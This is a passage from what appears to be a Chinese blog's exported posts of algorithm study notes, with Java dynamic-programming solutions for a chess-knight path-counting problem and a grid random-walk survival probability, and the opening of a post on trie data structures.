class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-题目四"><a href="#0x04-题目四" class="headerlink" title="0x04 题目四"></a>0x04 题目四</h3><p>象棋中马的跳法，请想象一个象棋的棋盘，然后把整个棋盘放入第一象限，棋盘的最左下角是(0,0)位置。那么整个棋盘就是横坐标上9条线、纵坐标上10条线的一个区域</p><p>给你三个 参数，x，y，k，返回如果“马”从(0,0)位置出发，必须走k步，最后落在(x,y)上的方法数有多少种</p><h4 id="1-0-4"><a href="#1-0-4" class="headerlink" title="1.0"></a>1.0</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 表示目的地为(x,y) 走k步</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">&lt;</span>  <span class="token number">0</span> <span class="token operator">||</span> x <span class="token operator">></span> <span class="token number">8</span> <span class="token operator">||</span> y <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> y <span class="token operator">></span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// 表示目的地为(0,0) 走0步</span>    <span class="token comment">// 所以(x == 0 &amp;&amp; y == 0)表示目的地确实是(0,0)，代表是1次成功的方法，而目的地是其他点则不成功</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> y <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// 目标为(x,y)，考虑周围哪个点走一步可以走到(x,y)，即周围成"日"的8个点</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">HorseJump</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-0-1"><a href="#3-0-1" class="headerlink" title="3.0"></a>3.0</h4><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f14.png"></p><p>三个可变参数，所以是三维数组，越界即长方体外部则为0</p><p>base case为k=0，第0层，只有(0,0)为1，其他点都为0</p><p>从下往上一层一层往上算，每层的点都由下层的8个点之和决定</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">HorseJump2</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">&lt;</span>  <span class="token number">0</span> <span class="token operator">||</span> x <span class="token operator">></span> <span class="token number">8</span> <span class="token operator">||</span> y <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> y <span class="token operator">></span> <span class="token number">9</span> <span class="token operator">||</span> k <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 只有(0,0)为1，其他点都为0</span>    <span class="token comment">// 从下往上一层一层往上算</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> h<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>h<span class="token operator">&lt;</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>h<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">9</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">&lt;</span>  <span class="token number">0</span> <span class="token operator">||</span> x <span class="token operator">></span> <span class="token number">8</span> <span class="token operator">||</span> y <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> y <span class="token operator">></span> <span class="token number">9</span> <span class="token operator">||</span> k <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x05-题目五"><a href="#0x05-题目五" class="headerlink" title="0x05 题目五"></a>0x05 题目五</h3><p>给定五个参数n,m,i,j,k</p><p>表示在一个N*M的区域，Bob处在(i,j)点，每次Bob等概率的向上、下、左、右四个方向移动一步，Bob必须走K步</p><p>如果走完之后，Bob还停留在这个区域上， 就算Bob存活，否则就算Bob死亡</p><p>请求解Bob的生存概率，返回字符串表示分数的方式</p><h4 id="1-0-5"><a href="#1-0-5" class="headerlink" title="1.0"></a>1.0</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">gcd</span><span class="token punctuation">(</span><span class="token keyword">long</span> a<span class="token punctuation">,</span> <span class="token keyword">long</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> b <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> a <span class="token operator">:</span> <span class="token function">gcd</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> a<span class="token operator">%</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">int</span> rest<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> i <span class="token operator">>=</span> n <span class="token operator">||</span> j <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> j <span class="token operator">>=</span> m<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rest <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> live <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span> rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span> rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> i<span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> i<span class="token punctuation">,</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> live<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token class-name">BobDie</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> all <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> live <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> gcd <span class="token operator">=</span> <span class="token function">gcd</span><span class="token punctuation">(</span>live<span class="token punctuation">,</span> all<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>live<span class="token operator">/</span>gcd<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>all<span class="token operator">/</span>gcd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-0-2"><a href="#3-0-2" class="headerlink" title="3.0"></a>3.0</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token class-name">BobDie2</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>n<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>row<span class="token operator">&lt;</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>row<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> col<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>col<span class="token operator">&lt;</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>col<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> rest<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>rest<span class="token operator">&lt;</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>rest<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>row<span class="token operator">&lt;</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>row<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> col<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>col<span class="token operator">&lt;</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>col<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>row<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>row<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">long</span> all <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> live <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> gcd <span class="token operator">=</span> <span class="token function">gcd</span><span class="token punctuation">(</span>live<span class="token punctuation">,</span> all<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>live<span class="token operator">/</span>gcd<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>all<span class="token operator">/</span>gcd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>DP数组需要注意的是，可变的参数一定要满足</p><p>1）都是整型，即一维，而不应该是更高维的如数组</p><p>2）参数个数尽量少</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 左程云 </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>左神算法0x03</title>
      <link href="/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x03/"/>
      <url>/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x03/</url>
      
        <content type="html"><![CDATA[<p>【前缀树，贪心算法，暴力递归，N皇后】</p><h2 id="前缀树"><a href="#前缀树" class="headerlink" title="前缀树"></a>前缀树</h2><p>有一些字符串数组，对这个数组生成前缀树</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm3_f1.png"></p><p>节点类如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">TrieNode</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> path<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> end<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">TrieNode</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nexts<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">TrieNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        path <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        end <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        nexts <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TrieNode</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>path</code>值指的是经过该节点的字符串有几个，<code>end</code>值指的是以该节点结尾的字符串有几个，大小为26的<code>nexts</code>数组表示26个字母，每个字母下面连着哪条路，为<code>null</code>当然是指没有指向这个字母的路，具体如图</p><p><img 